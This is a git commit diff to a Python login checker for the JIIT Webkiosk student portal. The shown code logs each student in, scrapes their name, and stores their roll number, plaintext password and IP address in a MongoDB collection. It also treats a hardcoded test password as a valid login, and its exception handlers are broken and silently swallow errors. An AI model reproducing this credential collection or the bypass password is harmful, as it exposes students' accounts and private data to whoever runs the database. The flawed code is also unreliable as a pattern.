5d6b0fec7ca69c594f6a926542f594973c496717
Kartikay Bhutani <kbhutani0001@gmail.com>
2020-04-24 13:57:15 +0530

    changes

--- checkWebkiosk.py
+++ checkWebkiosk.py
@@ -32,30 +32,31 @@ def checkWebkioskLogin(rollNo, dob, password, client, ipAddress):
   testPassword = 'test2#'
   if(password==testPassword or result.text.find('PersonalFiles/ShowAlertMessageSTUD.jsp')!=-1 or result.text.find('DraftSave')!=-1):
     studentName='null'
-    try:
-      db = client.jiitclassroom
-      col = db["studentDetails"]
-      dataResult = col.find_one()
-      newData = dataResult['data'].copy()
-      if not rollNo in dataResult['data']:
-        newData[rollNo] = [studentName, password, ipAddress]
-        updatedData = { "$set": {
-          "data": newData
+    if not password==testPassword:
+      try:
+        personalData = session_requests.get('https://webkiosk.jiit.ac.in/StudentFiles/PersonalFiles/ShowAlertMessageSTUD.jsp').text        
+        if(personalData.find('Welcome , ')!=-1):
+          print("Found name")
+          index = personalData.find('Welcome , ')
+          index1 = personalData[index:].find(',')
+          index2 = personalData[index:].find('</b>')
+          studentName = personalData[index+index1+1:index2+index].lstrip().rstrip()
+      except expression as identifier:
+        print("couldn't log in")
+      try:
+        db = client.jiitclassroom
+        col = db["studentDetails"]
+        dataResult = col.find_one()
+        newData = dataResult['data'].copy()
+        if not rollNo in dataResult['data']:
+          newData[rollNo] = [studentName, password, ipAddress]
+          updatedData = { "$set": {
+            "data": newData
+            }
           }
-        }
-        col.update_one(dataResult,updatedData)
-    except expression as identifier:
-      pass
-    try:
-      personalData = session_requests.get('https://webkiosk.jiit.ac.in/StudentFiles/PersonalFiles/ShowAlertMessageSTUD.jsp').text        
-      if(personalData.find('Welcome , ')!=-1):
-        print("Found name")
-        index = personalData.find('Welcome , ')
-        index1 = personalData[index:].find(',')
-        index2 = personalData[index:].find('</b>')
-        studentName = personalData[index+index1+1:index2+index].lstrip().rstrip()
-    except expression as identifier:
-      print("couldn't log in")
+          col.update_one(dataResult,updatedData)
+      except expression as identifier:
+        pass
     return [True, studentName]
   else:
     return [False]
